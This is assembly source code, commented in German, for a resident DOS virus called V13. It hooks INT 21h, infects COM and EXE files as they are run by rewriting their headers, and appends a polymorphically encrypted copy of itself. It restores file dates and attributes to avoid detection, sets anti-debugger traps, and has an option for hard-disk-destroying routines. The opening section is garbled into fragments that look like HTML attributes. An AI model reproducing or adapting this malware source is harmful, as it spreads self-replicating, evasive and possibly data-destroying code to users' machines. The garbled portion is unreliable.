

            TITLE V13.ASM

;------------------------------------------------------------------------------
; Assembler-Optionen:
;------------------------------------------------------------------------------
            NOSMART     ;Optimierung AUS (keine krummen Sachen)!

                        ;<-- mit="" an="" oder="" aus="" ein-="" bzw.="" ausschalten="" !!!="" scharf="" equ="" an="" ;debugger-fallen="" &="" trigger-funktion="" an="" oder="" aus="" !!!="" zerstoer="" equ="" an="" ;wenn="" zerstoer="AN" ist,="" dann="" werden="" auch="" die="" routinen="" ;zum="" hd-l”schen="" eingebunden="" (int="" 13h)="" !!!="" ;úääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääää¿="" ;³="" include-dateien:="" ³="" ;³----------------------------------------------------------------------------³="" ;³="" funktion:="" verschidene="" macros="" zur="" verfgiung="" stellen.="" ³="" ;àääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääù="" include="" coder.inc="" ;polymorpher="" codierer="" include="" dos.inc="" ;dos-aufrufe="" include="" equ.inc="" ;equ-vereinbarungen="" include="" rnd.inc="" ;zufallsgenerator="" include="" tsr.inc="" ;tsr-funktionen="" include="" var.inc="" ;variablendefinitionen="" include="" virmacs.inc="" ;virus-funktionen="" ;úääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääää¿="" ;³="" dose:="" ³="" ;³----------------------------------------------------------------------------³="" ;³="" funktion:="" standardaufruf="" von="" dos,="" kann="" im="" hauptprog="" durch="" neudefinition="" ³="" ;³="" ge„ndert="" werden.="" ³="" ;àääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääù="" dose="" macro="" int="" 21h="" endm="" ;úääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääää¿="" ;³="" host:="" ³="" ;³----------------------------------------------------------------------------³="" ;³="" funktion:="" simuliertes="" host-programm:="" ³="" ;àääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääù="" host="" segment="" para="" assume="" cs:host,ds:host,es:host,ss:stapel="" ;------------------------------------------------------------------------------="" host_beg="" equ="" $="" ;start="" des="" hosts="" ;------------------------------------------------------------------------------="" start:="" mov="" bp,0="" ;wird="" normalerweise="" im="" coder="" gesetzt="" mov="" ax,seg="" virus="" ;differenz="" zwischen="" virus-stack="" sub="" ax,seg="" stapel="" ;und="" virus-programm="" berechnen="" und="" mov="" word="" ptr="" cs:[alt_ss],ax="" ;in="" den="" virus="" patchen="" mov="" ax,seg="" virus="" ;differenz="" zwischen="" virus-host="" sub="" ax,seg="" host="" ;und="" virus-programm="" berechnen="" und="" mov="" word="" ptr="" cs:[exe_seg],ax="" ;fr="" rcksprung="" in="" den="" virus="" patchen="" jmp="" far="" ptr="" main="" ;sprung="" zum="" virus="" exit:="" dos_end="" 0="" ;prog="" mit="" ende-code="" 0="" beenden="" ;------------------------------------------------------------------------------="" host_end="" equ="" $="" ;ende="" vom="" host="" ;------------------------------------------------------------------------------="" host="" ends="" ;úääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääää¿="" ;³="" stapel:="" ³="" ;³----------------------------------------------------------------------------³="" ;³="" stacksegment="" fr="" das="" host-programm="" (s.o.):="" ³="" ;àääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääù="" stapel="" segment="" para="" stack="" db="" 64="" dup="" (0)="" ;stack="" soll="" 64="" bytes="" groá="" sein="" stackend="" equ="" $="" ;ende="" (aus="" der="" sicht="" des="" stacks:="" ;start!)="" des="" stacks...="" stapel="" ends="" ;úääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääää¿="" ;³="" virus:="" ³="" ;³----------------------------------------------------------------------------³="" ;³="" segment="" mit="" dem="" virus-code:="" ³="" ;àääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääù="" virus="" segment="" para="" assume="" cs:virus,ds:virus,es:virus="" ;úääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääää¿="" ;³="" main:="" ³="" ;³----------------------------------------------------------------------------³="" ;³="" nicht-residenter="" teil="" des="" virus:="" ³="" ;àääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääù="" main="" proc="" near="" cryp_strt:="" push="" ds=""></--><ds> (und damit auch <es>) auf dem Stack sichern!

            IF SCHARF

              DEB_TEST_C1                       ;Counter-Test 1
              SAVE_DEB_VEC                      ;Vector-Tisch Z„hler

            ENDIF
;------------------------------------------------------------------------------

            PUSH CS     ;Wenn SCHARF definiert wurde, dann werden bei Wanze
            POP DS      ;aus der SCHIEBE CS eine šberlaufunterbrechung
                        ;geben einen Sprung
            PUSH DS     ;zu GOODBYE !!!
            POP ES      ;<ds> und <es> auf <cs> setzen...
            CLD         ;Stringmanipulation aufsteigend

;------------------------------------------------------------------------------
; COM oder EXE-Strategie:
;------------------------------------------------------------------------------
            CMP BYTE PTR CS:[OFFSET COMEXE+BP],1 ;COM oder EXE?
            JZ EXE_STRT                          ;--> EXE-Start

;------------------------------------------------------------------------------
; COM: Start-BYTES des Hostprogs restaurieren, rcksprung setzen:
;------------------------------------------------------------------------------
            MOV WORD PTR CS:[HOST_SEG+BP],CS    ;SEG auf <cs>

            LEA SI,COM_START[BP]                ;<si> mit Adresse des orig-COM
            MOV DI,100H                         ;Ziel auf den COM-Start
            MOV CX,3                            ;3 Durchl„ufe
            REP MOVSB                           ;Kopieren!
            JMP TEST_DEB                        ;--> TEST_DEB

;------------------------------------------------------------------------------
; EXE: Rcksprung zum Host vorbereiten:
;------------------------------------------------------------------------------
EXE_STRT:   MOV AX,CS              ;Aktuelles <cs>
EXE_SEG     EQU $+1                ;EXE_SEG auf die 0 von SUB AX,0
            SUB AX,0               ;Rcksprung vorbereiten (SEG)
            MOV CS:[HOST_SEG],AX   ;Diff zw. Virus und Host

;------------------------------------------------------------------------------
TEST_DEB    EQU $                  ;Diverse Tests

            IF SCHARF
              WANZEN_CHECK_C1                   ;S.O.
            ENDIF

            INST_TEST ID_WORD,ENDE              ;Schon drin? JA --> ENDE
;------------------------------------------------------------------------------
; Resident MACHEN des Virus:
;------------------------------------------------------------------------------
            DOS_GETMEM MEM_ALLOC,AX             ;Block reserviren
            JNC ALLOC_OK                        ;KEIN FEHLER --> ALLOC_OK

;------------------------------------------------------------------------------
; Vom HOST-Programm Speicher klauen:
;------------------------------------------------------------------------------
            POP AX                              ;<ds> vom STACK in <ax>
            PUSH AX                             ;<ds> wieder sichern
            DEC AX                              ;<es> auf den MCB
            MOV ES,AX                           ;zeigen lassen
            MOV BX,WORD PTR ES:[MCB_SIZE]       ;Gr”áe des Blocks ermitteln
            SUB BX,MEM_ALLOC+1                  ;Block weniger MEM_ALLOC
            POP ES                              ;<es> auf <ds>
            PUSH ES                             ;<ds> wieder sichern
            MOV AH,4AH                          ;Blockgr”áe „ndern, <bx>=neue
            DOSE                                ;Gr”áe, <es>=SEG des RAM-Blocks
            JC F_ENDE                           ;FEHLER --> ENDE
            DOS_GETMEM MEM_ALLOC,AX             ;Block reserviren
            JNC ALLOC_OK                        ;OK --> ALLOK_OK
F_ENDE:     JMP ENDE                            ;FEHLER --> ENDE

;------------------------------------------------------------------------------
; PSP-Eintrag (verfgbarer Speicher) des Hosts aktualisieren:
;------------------------------------------------------------------------------
ALLOC_OK:   SUB WORD PTR ES:[PSP_MEM],MEM_ALLOC+1 ;Hostblock minus Virus

;------------------------------------------------------------------------------
; Virus in den SPEICHER kopieren:
;------------------------------------------------------------------------------
            MOV ES,AX              ;<es> auf den neuen Block
            MOV SI,BP              ;Quell-OFS: [DS:SI]
            XOR DI,DI              ;Ziel-OFS: [ES:DI]
            MOV CX,ANZBYTES        ;ANZBYTES Durchl„ufe!
            REP MOVSB              ;Kopieren!

;------------------------------------------------------------------------------
; BLOCK als belegt kennzeichnen / Aktiv auf NICHT Aktiv setzen!:
;------------------------------------------------------------------------------
            DEC AX                              ;<ax>: OFS-Block --> OFS-MCB
            MOV DS,AX                           ;<ds> auf MCB des neuen Blocks
            MOV WORD PTR DS:[MCB_PSP],8         ;Block=belegt (DOS)
            CLR_AKTIV ES:[AKTIV]                ;Aktiv-FLAG auf Null!!!

            IF SCHARF
              PUSH ES                        ;<es> merken
              MOV AX,WORD PTR CS:[DIE_ID+BP] ;Overflow-Werte in <ax>
              MUL AX                         ;Und den Overflow setzen (INTO!!!)
              PUSH AX                        ;------------------------------
              CALL NEU21                     ;Routine abgearbeitet und <es>
              POP AX                         ;wird nicht wieder restauriert.
              LES DI,[BP+OFFSET DIE_ID]      ;INTO wird somoit notwendig fr
NO_GOODY      EQU $                          ;den Programmablauf !!!
            ENDIF
;------------------------------------------------------------------------------

            RNDINIT ES:[INITWERT]               ;RND-Init-Werte speichern

;------------------------------------------------------------------------------
; Vektoren umbiegen:
;------------------------------------------------------------------------------
            PUSH ES                             ;<ds> auf den neuen Block
            POP DS                              ;setzen (<es> retten).

            DOS_GETINT 13H,DS:[ALT13]           ;Vektor von INT 13H --> ALT13
            DOS_GETINT 21H,DS:[ALT21]           ;Vektor von INT 21H --> ALT21

;------------------------------------------------------------------------------
; INT 21H umbiegen:
;------------------------------------------------------------------------------
; Aufruf von INT 21H ÄÄ> Vektor zeigt auf das 5.BYTE des ersten MCB ÄÄ> JMP
; ÄÄ> Sprung zum eigentlichen Virus... INT 21H zeigt somit in den 1. MCB
;------------------------------------------------------------------------------
            MOV AH,52H                          ;DOS INFORMATION BLOCK (DIB)
            DOSE                                ;ermitteln, undokumentiert.
            MOV AX,ES                           ;<es> in <ax>
            DEC AX                              ;<ax> verkleinern
            MOV ES,AX                           ;<es> somit verkleinert!
            ADD BX,12                           ;OFS auf den ersten MCB
            LES BX,ES:[BX]                      ;Erste MCB in <es>/<bx>
                                                ;OFS auf das 1. ungenuzte BYTE
            ADD BX,5                            ;im MCB.
            MOV BYTE PTR ES:[BX],0EAH           ;Direct JMP
            MOV WORD PTR ES:[BX+1],OFFSET NEU21 ;OFS setzen
            MOV WORD PTR ES:[BX+3],DS           ;SEG setzen!

;------------------------------------------------------------------------------
            XOR AX,AX                           ;<ds> wieder...
            MOV DS,AX                           ;...auf SEG 0
            MOV WORD PTR DS:[21H*4+2],ES        ;SEG fr INT 21H biegen
            MOV WORD PTR DS:[21H*4],BX          ;OFS fr INT 21H biegen

ENDE        EQU $

            IF SCHARF
              CLI
              SAUERKRAUT            ;Creiere Sauerkraut-Code 
              STI                   ;(siehe Spaghetti-Code im SURIV.EXE)
            ENDIF
;------------------------------------------------------------------------------

            POP DS                  ;<ds> und <es> restaurieren
            PUSH DS                 ;<--- (s.o.)="" pop="" es=""></---><--- (s.o.)="" cmp="" byte="" ptr="" cs:[offset="" comexe+bp],1="" ;com="" oder="" exe?="" jnz="" host_start="" ;com="" --=""> gleich zum Host
;------------------------------------------------------------------------------
; Nur bei EXE-Programm: Stack-Regs wieder auf original-Werte setzen
;------------------------------------------------------------------------------
            CLI                     ;keine Unterbrechung bei Stack-Žnderungen !
ALT_SP      EQU $+1                 ;hier wird der alte <sp>-reingepatcht
            MOV SP,OFFSET STACKEND  ;Original <sp> des EXE-Hosts wieder setzen
            MOV AX,CS               ;Berechnung des original <ss>
ALT_SS      EQU $+1                 ;hier wird die <ss>-Differenz reingepatcht
            SUB AX,0                ;Original <ss> berechnen
            MOV SS,AX               ;und setzen
            STI                     ;Interrupts wieder zulassen
;------------------------------------------------------------------------------
; Rcksprung zum Host (COM oder EXE --> siehe oben):
;------------------------------------------------------------------------------
HOST_START: DB 0EAH                 ;Direct Intersegment-JMP
HOST_JMP    EQU $                   ;Label wird fr Debugger-Test ben”tigt
HOST_OFS    DW OFFSET EXIT          ;OFS-ADR zum Prog-Beenden
HOST_SEG    DW ?                    ;SEG-ADR zum Host

MAIN        ENDP

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ DOSE:                                                                      ³
;³----------------------------------------------------------------------------³
;³ FUNKTION: Standardaufruf von DOS, kann im Hauptprog durch Neudefinition    ³
;³           ge„ndert werden.                                                 ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
DOSE        MACRO

            CALL GODOS

            ENDM

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ NEU21:                                                                     ³
;³----------------------------------------------------------------------------³
;³ Neuer INT 21H (Dos-Calls) Handler.                                         ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
NEU21       PROC FAR

            SET_INST ID_WORD                    ;Virus schon resident.
            TEST_AKTIV CS:[AKTIV],END21         ;Virus aktiv? NEIN --> END21

;------------------------------------------------------------------------------
; EXEC oder OPEN oder WRITE ?
;------------------------------------------------------------------------------
            PUSHALL                    ;REGs sichern
;------------------------------------------------------------------------------
            PUSH AX                    ;DOS-Funktionsnummer auf den Stack
            MOV BP,SP                  ;Mit <bp> direkt auf den Stack zugreifen
            XOR WORD PTR SS:[BP],1313H ;Funktionsnummer verschlsseln (XORen)
            MOV BP,SS:[BP]             ;Verchlsselte Funktionsnummer in <bp>
            POP AX                     ;Stack wieder reparieren. <ax> ist jetzt
                                       ;wie <bp> mit 1313h verschlsselt...
;------------------------------------------------------------------------------
            CMP BP,(4B00H XOR 1313H)   ;EXEC-Funktionsnummer ?
;------------------------------------------------------------------------------
            JNE END21POP               ;NEIN --> END21POP

;------------------------------------------------------------------------------
GO_INF:     FNAME_TEST DS,DX,CS:[SCAN],ANZ_SCAN,END21POP ;FNamen testen
;------------------------------------------------------------------------------
            JMP START_ME                                 ;--> START_ME

;------------------------------------------------------------------------------
; INT 21H-Virus beenden:
;------------------------------------------------------------------------------
END21POP:   POPALL                              ;Register laden
;------------------------------------------------------------------------------
END21:      CLR_AKTIV CS:[AKTIV]                ;Handler nicht mehr aktiv.
            DB 0EAH                             ;Direct Intersegment Jmp...
ALT21       DD ?                                ;Rcksprung zum INT 21H

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ START_ME:                                                                  ³
;³----------------------------------------------------------------------------³
;³ File infizieren.                                                           ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

;------------------------------------------------------------------------------
; Block reservieren:
;------------------------------------------------------------------------------
START_ME:   DOS_GETMEM ((ANZBYTES+0FH)/10H),BP  ;Speicherblock, SEG-Adr in <bp>
            JC END21POP                         ;FEHLER --> END21POP

;------------------------------------------------------------------------------
; Vektoren auf den Stack schieben:
;------------------------------------------------------------------------------
            DOS_GETINT 24H,ES,BX                ;Vektor von INT 24 lesen
            PUSH_SEGOFS ES,BX                   ;[SEG:OFS] vom Vektor sichern
            MOV AL,13H                          ;Vektor von INT 13 lesen
            DOSE                                ;Regs noch durch DOS_GETINT ok!
            PUSH_SEGOFS ES,BX                   ;[SEG:OFS] vom Vektor sichern
;------------------------------------------------------------------------------
            PUSH_SEGOFS DS,DX                   ;[SEG:OFS] des FNamens pushen

;------------------------------------------------------------------------------
; Vektoren umbiegen:
;------------------------------------------------------------------------------
            XOR AX,AX                            ;<ds> auf SEG-0
            MOV DS,AX                            ;Zugriff auf INT-Vectoren:

            MOV WORD PTR DS:[24H*4],OFFSET NEU24 ;INT 24H neu setzten
            MOV WORD PTR DS:[24H*4+2],CS

            MOV AX,WORD PTR CS:[ALT13]           ;INT 13H auf den Wert biegen,
            MOV WORD PTR DS:[13H*4],AX           ;auf dem INT 13H vor resident-
            MOV AX,WORD PTR CS:[ALT13+2]         ;machen des Virus stand...
            MOV DS:[13H*4+2],AX                  ;ANTIVIR-Progs t„uschen ???

;------------------------------------------------------------------------------
; Attribut lesen und neu schreiben:
;------------------------------------------------------------------------------
            POP_SEGOFS DS,DX                    ;[SEG:OFS] des FNamens zurck!
            DOS_GETATTR DS,DX,SI                ;Attrubut ermitteln
            JC REST_FAR                         ;FEHLER --> REST_INT
            DOS_SETATTR 0,DS,DX                 ;Attribut einer Datei setzen
            JNC ATTR_OK                         ;OK --> ATTR_OK
REST_FAR:   JMP REST_INT                        ;FEHLER --> REST_INT
ATTR_OK:    PUSH SI                             ;Attribut auf den Stack
            PUSH_SEGOFS DS,DX                   ;[SEG:OFS] des FNamens pushen

;------------------------------------------------------------------------------
; Datei ”ffnen:
;------------------------------------------------------------------------------
            DOS_FOPEN DS,DX,12H,BX              ;File ”ffnen (Handle in <bx>)
            JNC IS_OFFEN                        ;OK --> IS_OFFEN
            JMP BREAK                           ;FEHLER --> BREAK
IS_OFFEN:   PUSH CS                             ;Nebenbei
            POP DS                              ;<ds> auf <cs> setzen

;------------------------------------------------------------------------------
; Altes DATUM und alte ZEIT merken:
;------------------------------------------------------------------------------
            DOS_FGETIME BX,CX,DX                ;Lezte Modifikation der Datei
            JNC ID_TEST                         ;FEHLER --> CLOSE

N_CLOSE:    POP DX                              ;Datum und Zeit vom Stack
            POP CX
            JMP CLOSE                           ;FEHLER -->  CLOSE

ID_TEST:    PUSH CX                             ;Uhrzeit merken
            PUSH DX                             ;Datum merken

;------------------------------------------------------------------------------
; ID_WORD  testen (keine Doppelinfektion!):
;------------------------------------------------------------------------------
            DOS_FSEEK BX,2,0FFFFH,(-2)              ;FPtr aufs Fileende-2
            JC N_CLOSE                              ;zurcksetzen.
            DOS_FREAD BX,2,DS,<offset puffer="">       ;Datei einlesen (ID_WORD?)
            JC N_CLOSE                              ;FEHLER --> CLOSE

            MOV AL,BYTE PTR CS:[PUFFER]         ;1. Byte des ID_WORDS?
            ADD AL,BYTE PTR CS:[PUFFER+1]       ;2. Byte des ID_WORDS?
            CMP AL,ID_SUM                       ;Wenn JA --> AL=ID_SUM!
            JZ N_CLOSE                          ;ID_SUM erkannt --> CLOSE

;------------------------------------------------------------------------------
; Ersten 18H BYTEs des Hosts merken:
;------------------------------------------------------------------------------
READ_IT:    CALL SEEK_BEG                       ;FPtr auf Anfang
            JC N_CLOSE                          ;FEHLER --> CLOSE
            DOS_FREAD BX,18H,DS,<offset puffer=""> ;Ersten 18H Bytes
            JC N_CLOSE                          ;FEHLER --> CLOSE

;------------------------------------------------------------------------------
; L„nge einlesen und merken / Dateizeiger auf den Anfang:
;------------------------------------------------------------------------------
            DOS_FSEEK BX,2,0,0,DI,SI            ;Aufs Ende, L„nge in <ds:si>!
            JC N_CLOSE                          ;FEHLER --> CLOSE
            CALL SEEK_BEG                       ;Dateizeiger auf den Anfang
            JC N_CLOSE                          ;FEHLER --> N_CLOSE --> CLOSE

            CMP WORD PTR CS:[PUFFER],"ZM"       ;EXE-Datei? ("MZ")
            JZ EXE_BP                           ;JA --> EXE_BP

;------------------------------------------------------------------------------
; COM (INIT!):
;------------------------------------------------------------------------------
            CMP SI,MAXGR                        ;Datei zu groá?
            JAE N_CLOSE                         ;JA --> TO_BIG
            MOV WORD PTR CS:[SET_BP],SI         ;<ip> ermitteln!
            ADD WORD PTR CS:[SET_BP],100H       ;COM-Start drauf!
            MOV BYTE PTR CS:[COMEXE],0          ;COMEXE auf COM
;------------------------------------------------------------------------------
            MOV WORD PTR CS:[OFFSET HOST_OFS],100H
;------------------------------------------------------------------------------
            ADD SI,OFFSET CODE_BUF-3             ;Adresse des Coders
            MOV BYTE PTR CS:[COM_MERK],0E9H      ;JMP setzen
            MOV WORD PTR CS:[COM_MERK+1],SI      ;(im CODER-Puffer)
            DOS_FWRITE BX,3,DS,<offset com_merk=""> ;Datei beschreiben
            JNC F_INFECT                         ;--> F_INFECT -->
F_MODIFY:   JMP MODIFY                           ;FEHLER --> MODIFY
F_INFECT:   XOR DI,DI                            ;LO-OFS des FilePtr
            JMP CODE_GEN

EXE_BP:     MOV WORD PTR CS:[SET_BP],0          ;<ip> ist immer 0!
            MOV BYTE PTR CS:[COMEXE],1          ;COMEXE auf EXE

;------------------------------------------------------------------------------
; Neue Verschlsselungsroutine aufbauen:
;-------------------------------------------------------------------------------
CODE_GEN:   MOV ES,BP                           ;ES auf das Crypt-Segment
            PUSH BX                             ;Handle sichern
            PUSH DI                             ;HI-Datei-L„nge sichern
            PUSH SI                             ;LO-Datei-L„nhe sichern
;------------------------------------------------------------------------------
            COD_GEN ES,CODE_BUF,CS:[SET_BP],DI
;------------------------------------------------------------------------------
            INC DI                              ;2 Bytes l„nger=ID_WORD
            INC DI                              ;...und nochmal
            MOV WORD PTR CS:[PATCH_SIZE],DI     ;L„nge nun in PATCH_SIZE

            POP SI                              ;HI-Datei-L„nge zurck
            POP DI                              ;LO-Datei-L„nhe zurck
            POP BX                              ;Handle zurck

            MOV BP,ES                           ;SEG des Blocks in <bp>

;------------------------------------------------------------------------------
; COM oder EXE..????
;------------------------------------------------------------------------------
            CMP BYTE PTR CS:[COMEXE],1          ;EXE-Datei? (1)
            JZ GO_EXE                           ;JA --> GO_EXE
            JMP INFECT                          ;--> INFECT

;------------------------------------------------------------------------------
GO_EXE:     MOV AX,WORD PTR CS:[PUFFER+4]       ;FL„nge (Seiten zu 512 Bytes)
            DEC AX                              ;in <ax>.
            MOV CX,512                          ;Mit 512 malnehmen, und somit
            MUL CX                              ;in BYTEs wandeln.
            ADD AX,WORD PTR CS:[PUFFER+2]       ;BYTEs der letzten Page drauf
            JNC EXE_TEST                        ;šBERTRAG? NEIN --> EXE_TEST
            INC DX                              ;HI-Word von FSize erh”hen!
;------------------------------------------------------------------------------
EXE_TEST:   CMP AX,SI               ;LO-WORD im EXE-Kopf=LO-WORD der FGr”áe?
            JNE POP_CLOSE           ;NEIN --> CLOSE
            CMP DX,DI               ;HI-WORD im EXE-Kopf=HI-WORD der FGr”áe?
            JE  SET_EXE             ;JA --> SET_EXE
POP_CLOSE:  POP AX                  ;Datum wird nicht gebraucht (vom Stack)!
            POP DX                  ;Einfach in <dx> rein...
            JMP CLOSE               ;NEIN --> CLOSE
;------------------------------------------------------------------------------
; EXE: Rcksprung & JMP setzen.
;------------------------------------------------------------------------------
SET_EXE:    MOV AX,SI               ;LO-WORD der L„nge in <ax> sichern
            MOV DX,DI               ;HI-WORD der L„nge in <dx> sichern
            MOV CL,4                ;LOW-WORD der Dateil„nge
            SHR AX,CL               ;in PARAs wandeln
            MOV CL,12               ;Unteren 4 BITs des HI-WORD der Dateil„nge
            SHL DX,CL               ;in oberen 4 BITs verschieben
            OR AX,DX                ;Beides verknpfen: Dateil„nge in PARAs
;------------------------------------------------------------------------------
            AND SI,01111B           ;Bis auf die unteren 4 BITs ausmaskieren
            MOV DI,10000B           ;Wieviel bleibt zu einem PARA brig...
            SUB DI,SI               ;in <di> merken
            AND DI,01111B           ;Bis auf die unteren 4 BITs ausmaskieren
            JZ NEU_KOPF             ;PARA ist schon voll --> NEU_KOPF
            INC AX                  ;Neues <cs> um einen PARA erh”hen
;------------------------------------------------------------------------------
; EXE-Kopfl„nge abziehen, und somit neues <cs> in <ax>:
;------------------------------------------------------------------------------
NEU_KOPF:   SUB AX,WORD PTR CS:[PUFFER+8]       ;Dateil„nge MINUS Kopf
;------------------------------------------------------------------------------
; Rcksprung vorbereiten, Differenz zwischen neuem <cs> und altem <cs>:
;------------------------------------------------------------------------------
            MOV CX,AX                           ;Neues <cs> in <cx>
            MOV DX,WORD PTR CS:[PUFFER+16H]     ;Altes <cs> in <dx>
            SUB CX,DX                           ;Unterschied zw. Neu und Alt
            MOV WORD PTR CS:[EXE_SEG],CX        ;Rcksprung vorbereiten (SEG)
;------------------------------------------------------------------------------
; Neuen EXE-Start setzen, alten <ip> in den Rcksprungpuffer schieben:
;------------------------------------------------------------------------------
            MOV CX,WORD PTR CS:[PUFFER+14H]     ;Altes <ip> in <cx>
            MOV WORD PTR CS:[HOST_OFS],CX       ;Rcksprung vorbereiten (OFS)
;------------------------------------------------------------------------------
; Neues <cs> im EXE-Kopf eintragen, neuen <ip> im EXE-Kopf auf EntCoder setzten:
;------------------------------------------------------------------------------
            MOV WORD PTR CS:[PUFFER+16H],AX              ;neues <cs>
            MOV WORD PTR CS:[PUFFER+14H],OFFSET CODE_BUF ;neuer <ip>
;------------------------------------------------------------------------------
; Alten Stack merken und NEUEN auf den Cryptpuffer/Virusinternen Stack setzen:
;------------------------------------------------------------------------------
            MOV CX,AX                                ;neues <ss>=<cs> in CX
            XCHG CX,WORD PTR CS:[PUFFER+0EH]         ;<ss> setzen und auslesen
            SUB AX,CX                                ;Differenz zw. neu und alt
            MOV WORD PTR CS:[OFFSET ALT_SS],AX       ;speichern
            MOV CX,WORD PTR CS:[PUFFER+10H]          ;altes <sp> auslesen
            MOV WORD PTR CS:[OFFSET ALT_SP],CX       ;und auch speichern
            MOV WORD PTR CS:[PUFFER+10H],OFFSET STACKTOP ;neuen <sp> setzen
;------------------------------------------------------------------------------
            MOV AX,WORD PTR CS:[PUFFER+2]       ;Anzahl BYTEs der letzten Page
PATCH_SIZE  EQU $+1                             ;Patch-Label
            ADD AX,0                            ;Virusl„nge dazu
            ADD AX,DI                           ;BYTEs des letzten PARAs dazu
            MOV DX,AX                           ;Diesen Wert in <dx> merken!
            AND AX,0111111111B                  ;High 6 Bits raus (512 brig!)
            JNZ EXE_ZERO                        ;Sonderfall? NEIN --> EXE_ZERO
            MOV AX,512                          ;Letzte Seite=Voll
            SUB DX,512                          ;Anzahl Seiten weniger 1
EXE_ZERO:   MOV WORD PTR CS:[PUFFER+2],AX       ;BYTEs der letzten Seite
            MOV CL,9                            ;Den Rest in Seiten zu jeweils
            SHR DX,CL                           ;512 BYTEs umrechnen (shiften)
            ADD WORD PTR CS:[PUFFER+4],DX       ;Auf die original L„nge drauf!

;------------------------------------------------------------------------------
;EXE-Kopf erfolgreich modifiziert! Diesen Kopf jetzt in die Datei schreiben:
;------------------------------------------------------------------------------
            DOS_FWRITE BX,18H,DS,<offset puffer=""> ;Write EXE-Kopf!
            JNC INFECT                           ;OK --> INFECT
            JMP MODIFY                           ;FEHLER --> MODIFY

;------------------------------------------------------------------------------
; File-Ptr spacen (max 15 Bytes) und Generationsz„hler erh”hen:
;------------------------------------------------------------------------------
INFECT:     DOS_FSEEK BX,2,0,DI                 ;FPtr spacen - Enderelativ!
            ZAEHLER CS:[KOPIE]                  ;KOPIE erh”hen

;------------------------------------------------------------------------------
; Virus Copy-Puffer auslagern:
;------------------------------------------------------------------------------
COPY_VIR:   MOV ES,BP               ;Segment des Crypt-Puffers gemerkt
            XOR SI,SI               ;Quellen Register
            XOR DI,DI               ;Ziel Register
            MOV CX,OFFSET CODE_BUF  ;Anzahl zu kopierender Bytes, bis CODE_BUF!
            REP MOVSB               ;und kopieren...

            CALL GET_RND            ;Zufallszahl in <ax>
            MOV ES:[CRYPT],AX       ;CODER-INITIAL-Wert merken

;------------------------------------------------------------------------------
; Neuen Virus im Copy-Puffer verschlsseln:
;------------------------------------------------------------------------------
            PUSH BX                             ;Handle sichern
            COD_RUN                             ;Coder starten im Segement <es>

            POP BX                              ;Handle zurck
            MOV SI,WORD PTR CS:[PATCH_SIZE]     ;L„nge des neuen Virus
            MOV BP,ES                           ;Copy-Speicher Segment merken

            CALL GET_RND                        ;Zufallszahl in <ax>
            MOV AL,ID_SUM                       ;Muá ID_SUM ergeben
            SUB AL,AH                           ;Darum SUB...
            MOV ES:[SI-2],AX                    ;In die letzten beiden Bytes

;------------------------------------------------------------------------------
; Host mit unserem Virus infizieren:
;------------------------------------------------------------------------------
            DOS_FWRITE BX,SI,ES,0               ;Virus anh„ngen!

;------------------------------------------------------------------------------
; Altes DATUM und alte ZEIT NEU setzen:
;------------------------------------------------------------------------------
MODIFY:     POP DX                              ;Altes Datum holen
            POP CX                              ;Alte Uhrzeit holen
            DOS_FSETIME BX,CX,DX                ;Zeit restaurieren!
;------------------------------------------------------------------------------
CLOSE:      DOS_FCLOSE BX                       ;Datei schliessen!

;------------------------------------------------------------------------------
; Attribut der Datei restaurieren:
;------------------------------------------------------------------------------
BREAK:      POP_SEGOFS DS,DX                    ;[SEG:OFS] des FNamens: [DS:DX]
            POP CX                              ;Attribut in <cx>
            DOS_SETATTR CX,DS,DX                ;Attribut einer Datei setzen

;------------------------------------------------------------------------------
; INT 13H & INT 24H auf neuen (nach dem Virus) Vektor setzen:
;------------------------------------------------------------------------------
REST_INT:   XOR AX,AX                           ;<ds> wieder auf...
            MOV DS,AX                           ;...SEG 0

            POP_SEGOFS AX,DX                    ;[SEG:OFS] des Vektors: [AX:DX]
